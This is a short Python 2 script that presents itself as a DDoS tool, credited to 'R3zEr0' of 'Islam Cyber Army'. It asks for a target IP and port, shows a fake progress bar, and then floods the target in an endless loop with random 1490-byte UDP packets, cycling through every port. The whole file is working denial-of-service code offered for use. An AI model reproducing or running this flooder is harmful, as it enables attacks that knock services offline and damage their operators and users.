#!/usr/bin/python2
# coding=utf-8

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDOS")

print "=========================="
print "Author   : R3zEr0"
print "TEAM     : Islam Cyber Army"
print "========================="
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Menyerang Website")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s Menyerang %s throught port80:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
